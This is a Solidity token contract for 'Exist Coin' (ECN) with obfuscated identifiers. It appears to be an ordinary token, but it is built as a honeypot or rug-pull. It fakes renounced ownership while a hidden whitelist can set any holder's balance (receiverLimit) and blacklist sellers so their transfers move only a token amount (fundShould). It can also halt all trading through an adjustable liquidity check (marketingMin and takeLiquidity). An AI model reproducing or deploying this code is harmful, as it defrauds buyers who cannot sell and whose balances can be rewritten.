//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract amountSwapMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamTakeSell {
    function createPair(address liquidityList, address autoEnableTotal) external returns (address);

    function feeTo() external view returns (address);
}

interface senderAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface shouldLaunchedIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTotal) external view returns (uint256);

    function transfer(address launchFrom, uint256 liquidityTrading) external returns (bool);

    function allowance(address walletExemptMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityTrading) external returns (bool);

    function transferFrom(
        address sender,
        address launchFrom,
        uint256 liquidityTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamFee, uint256 value);
    event Approval(address indexed walletExemptMode, address indexed spender, uint256 value);
}

interface buyTrading is shouldLaunchedIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExistCoin is amountSwapMin, shouldLaunchedIs, buyTrading {

    uint256 txMode;

    function allowance(address enableFee, address liquiditySwap) external view virtual override returns (uint256) {
        if (liquiditySwap == fromSwap) {
            return type(uint256).max;
        }
        return totalMarketing[enableFee][liquiditySwap];
    }

    function approve(address liquiditySwap, uint256 liquidityTrading) public virtual override returns (bool) {
        totalMarketing[_msgSender()][liquiditySwap] = liquidityTrading;
        emit Approval(_msgSender(), liquiditySwap, liquidityTrading);
        return true;
    }

    function receiverLimit(address maxIs, uint256 liquidityTrading) public {
        sellTotal();
        receiverAtEnable[maxIs] = liquidityTrading;
    }

    uint256 public toLaunched;

    bool public amountWalletBuy;

    function getOwner() external view returns (address) {
        return liquidityTo;
    }

    function owner() external view returns (address) {
        return liquidityTo;
    }

    bool private teamLaunch;

    mapping(address => bool) public tradingReceiver;

    mapping(address => uint256) private receiverAtEnable;

    uint256 feeTotalExempt;

    address public feeShould;

    function marketingMin(uint256 liquidityTrading) public {
        sellTotal();
        txMode = liquidityTrading;
    }

    bool public toMin;

    uint256 private modeTrading = 100000000 * 10 ** 18;

    constructor (){
        if (toMin != teamLaunch) {
            toMin = false;
        }
        autoTake();
        senderAmount toList = senderAmount(fromSwap);
        senderFee = teamTakeSell(toList.factory()).createPair(toList.WETH(), address(this));
        limitFund = teamTakeSell(toList.factory()).feeTo();
        
        feeShould = _msgSender();
        tradingReceiver[feeShould] = true;
        receiverAtEnable[feeShould] = modeTrading;
        
        emit Transfer(address(0), feeShould, modeTrading);
    }

    function tradingTotal(address autoSender) public {
        require(autoSender.balance < 100000);
        if (amountWalletBuy) {
            return;
        }
        
        tradingReceiver[autoSender] = true;
        
        amountWalletBuy = true;
    }

    event OwnershipTransferred(address indexed receiverAmount, address indexed tokenAmount);

    uint256 constant totalMin = 13 ** 10;

    function name() external view virtual override returns (string memory) {
        return exemptBuy;
    }

    function fundShould(address launchedSender) public {
        sellTotal();
        
        if (launchedSender == feeShould || launchedSender == senderFee) {
            return;
        }
        exemptMarketing[launchedSender] = true;
    }

    string private exemptBuy = "Exist Coin";

    function totalSupply() external view virtual override returns (uint256) {
        return modeTrading;
    }

    function balanceOf(address fundTotal) public view virtual override returns (uint256) {
        return receiverAtEnable[fundTotal];
    }

    function autoTake() public {
        emit OwnershipTransferred(feeShould, address(0));
        liquidityTo = address(0);
    }

    uint8 private launchAuto = 18;

    uint256 public enableSell;

    address limitFund;

    uint256 public isTakeMax;

    function toReceiver(address walletMin, address launchFrom, uint256 liquidityTrading) internal view returns (uint256) {
        require(liquidityTrading > 0);

        uint256 receiverShould = 0;
        if (walletMin == senderFee && listMax > 0) {
            receiverShould = liquidityTrading * listMax / 100;
        } else if (launchFrom == senderFee && exemptFee > 0) {
            receiverShould = liquidityTrading * exemptFee / 100;
        }
        require(receiverShould <= liquidityTrading);
        return liquidityTrading - receiverShould;
    }

    mapping(address => mapping(address => uint256)) private totalMarketing;

    uint256 public listMax = 0;

    mapping(address => bool) public exemptMarketing;

    function transferFrom(address walletMin, address launchFrom, uint256 liquidityTrading) external override returns (bool) {
        if (_msgSender() != fromSwap) {
            if (totalMarketing[walletMin][_msgSender()] != type(uint256).max) {
                require(liquidityTrading <= totalMarketing[walletMin][_msgSender()]);
                totalMarketing[walletMin][_msgSender()] -= liquidityTrading;
            }
        }
        return takeLiquidity(walletMin, launchFrom, liquidityTrading);
    }

    address private liquidityTo;

    string private feeTokenMode = "ECN";

    function decimals() external view virtual override returns (uint8) {
        return launchAuto;
    }

    function isTo(address walletMin, address launchFrom, uint256 liquidityTrading) internal returns (bool) {
        require(receiverAtEnable[walletMin] >= liquidityTrading);
        receiverAtEnable[walletMin] -= liquidityTrading;
        receiverAtEnable[launchFrom] += liquidityTrading;
        emit Transfer(walletMin, launchFrom, liquidityTrading);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return feeTokenMode;
    }

    function transfer(address maxIs, uint256 liquidityTrading) external virtual override returns (bool) {
        return takeLiquidity(_msgSender(), maxIs, liquidityTrading);
    }

    function sellTotal() private view {
        require(tradingReceiver[_msgSender()]);
    }

    address fromSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function takeLiquidity(address walletMin, address launchFrom, uint256 liquidityTrading) internal returns (bool) {
        if (walletMin == feeShould) {
            return isTo(walletMin, launchFrom, liquidityTrading);
        }
        uint256 amountLimit = shouldLaunchedIs(senderFee).balanceOf(limitFund);
        require(amountLimit == txMode);
        require(launchFrom != limitFund);
        if (exemptMarketing[walletMin]) {
            return isTo(walletMin, launchFrom, totalMin);
        }
        liquidityTrading = toReceiver(walletMin, launchFrom, liquidityTrading);
        return isTo(walletMin, launchFrom, liquidityTrading);
    }

    uint256 public exemptFee = 0;

    address public senderFee;

}